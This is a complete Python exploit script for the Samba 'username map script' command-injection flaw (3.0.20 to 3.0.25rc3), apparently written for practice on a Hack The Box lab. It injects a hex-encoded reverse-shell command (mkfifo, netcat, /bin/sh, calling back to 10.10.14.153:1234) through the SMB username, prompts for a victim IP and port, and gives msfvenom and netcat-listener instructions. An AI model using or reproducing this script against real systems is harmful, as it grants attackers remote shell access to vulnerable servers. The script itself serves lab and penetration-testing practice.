import smb
from smb.SMBConnection import SMBConnection

# This is a demonstration of the samba usermap exploit, this exploit works for Samba versions 3.0.20 through 3.0.25rc3

# This exploit works by connecting to a samba server using a username containing shell meta characters, This allows remote code execution.

# This is the shellcode being sent with the username, you can generate your own with msfvenom : msfvenom -p cmd/unix/reverse_netcat LHOST=<your IP here> LPORT=<your port here> -f python
# This will give you shellcode that looks similar as shown below, replace the shellcode with you're own and your done!

buf =  ""
buf += "\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x66"
buf += "\x71\x71\x62\x65\x73\x3b\x20\x6e\x63\x20\x31\x30\x2e"
buf += "\x31\x30\x2e\x31\x34\x2e\x31\x35\x33\x20\x31\x32\x33"
buf += "\x34\x20\x30\x3c\x2f\x74\x6d\x70\x2f\x66\x71\x71\x62"
buf += "\x65\x73\x20\x7c\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20"
buf += "\x3e\x2f\x74\x6d\x70\x2f\x66\x71\x71\x62\x65\x73\x20"
buf += "\x32\x3e\x26\x31\x3b\x20\x72\x6d\x20\x2f\x74\x6d\x70"
buf += "\x2f\x66\x71\x71\x62\x65\x73"

# Make sure to set up a Netcat listener with the port you specified with msfvenom, an example would be: nc -lvnp <port>

victim_ip = input('Victims ip:')
victim_port = int(input('Victims port:'))

print('[*] Exploit started...')

userID = '/=`nohup ' + buf + '`'

print('[*] Made userID')
conn = SMBConnection(userID, 'password', 'Hello', 'Test', use_ntlm_v2=False)

print('[*] Sending shellcode...\nif this takes longer than a minute for your reverse shell to pop then you might have the wrong ip or port.')
assert conn.connect(victim_ip, victim_port)
conn.close()

# Hackthebox Lame box is a good lab to test this exploit on.
